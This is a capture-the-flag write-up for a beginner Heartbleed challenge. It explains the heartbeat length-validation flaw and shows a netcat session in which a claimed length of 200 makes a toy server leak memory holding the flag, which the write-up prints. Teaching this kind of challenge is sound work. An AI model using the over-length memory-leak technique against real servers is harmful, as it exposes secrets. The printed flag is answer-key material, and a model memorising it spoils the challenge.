# Baby's First Heartbleed

## Description
Author: @JohnHammond#6971

Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!

Press the Start button on the top-right to begin this challenge.

## Solve
The title of the challenge gives us a clue that we will be dealing the the heartbleed vulnerability. There is an extension in OpenSSL called Heartbeat which checks if the both endpoints in a TLS encrypted handshake are still live by sending Heartbeat messages. One endpoint sends a request and the other will response with the exact same message. 

The problem comes from us being able to tell the server the length of our message and the server not validating if the length matches the message. This means if we send a length greater than the actual payload the server will respond to us with extra data it copied out of memory. In this case we can retrieve the contents of the flag from the memory.
```
user@arch:~$ nc challenge.nahamcon.com 31687

===============================================================================
     _   _ _____    _    ____ _____ ____  _     _____ _____ ____  
    | | | | ____|  / \  |  _ \_   _| __ )| |   | ____| ____|  _ \ 
    | |_| |  _|   / _ \ | |_) || | |  _ \| |   |  _| |  _| | | | |
    |  _  | |___ / ___ \|  _ < | | | |_) | |___| |___| |___| |_| |
    |_| |_|_____/_/   \_\_| \_\|_| |____/|_____|_____|_____|____/ 
                                                                      
===============================================================================

THANK YOU FOR CONNECTING TO THE SERVER. . .

TO VERIFY IF THE SERVER IS STILL THERE, PLEASE SUPPLY A STRING.

STRING ['apple']: test
LENGTH ['4']: 100

... THE SERVER RETURNED:

test@apple@00@00@00@00@00@00@00@00@00@00@00@00@00@00@apple@00@00@apple@00@apple@00@apple@00@apple@00

TO VERIFY IF THE SERVER IS STILL THERE, PLEASE SUPPLY A STRING.

STRING ['apple']: test
LENGTH ['4']: 200

... THE SERVER RETURNED:

test@test@apple@00@00@00@00@00@00@00@00@00@00@00@00@00@00@apple@00@00@apple@00@apple@00@apple@00@apple@00@flag{bfca3d71260e581ba366dca054f5c8e5}@apple@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@0
```

## Flag
```
flag{bfca3d71260e581ba366dca054f5c8e5}
```